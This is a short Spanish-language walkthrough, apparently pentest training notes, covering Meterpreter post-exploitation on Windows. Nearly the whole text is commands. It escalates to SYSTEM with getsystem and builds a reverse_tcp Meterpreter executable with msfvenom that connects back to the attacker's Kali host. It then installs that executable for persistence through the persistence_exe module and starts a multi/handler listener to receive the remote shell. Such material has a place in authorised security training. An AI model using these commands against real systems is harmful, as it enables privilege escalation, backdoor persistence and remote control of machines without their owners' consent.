# Uso de Meterpreter para la escalada de privilegios, persistencia y pivoting

Obtenemos más información del sistema

```
sysinfo
```

Realizamos una escala de privilegios

```bash
getsystem -t 1
```

Comprobamos el usuario propietario de la shell

```bash
getuid
```

Ponemos en segundo plano la sesión

```bash
background
```

Generamos un ejecutable malicioso con msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IPv4 Kali> LPORT=1234 -f exe -o /tmp/evil.exe
```

Usamos un módulo de post-explotación \(persistencia\)

```bash
use post/windows/manage/persistence_exe
```

Configuramos la sesión de meterpreter que hará de puente

```bash
set session <id de la sesión de meterpreter en segundo plano>
```

Elegimos el ejecutable malicioso

```bash
set rexepath /tmp/evil.exe
```

Lanzamos el módulo

```bash
run
```

Usamos un módulo de escucha

```bash
use exploit/multi/handler
```

Configuramos el payload a utilizar

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Configuramos el host local

```bash
set LHOST <IPv4 Kali>
```

Configuramos el puerto de escucha

```bash
set LPORT <PUERTO del exe malicioso>
```

Lanzamos el módulo de escucha

```bash
run
```



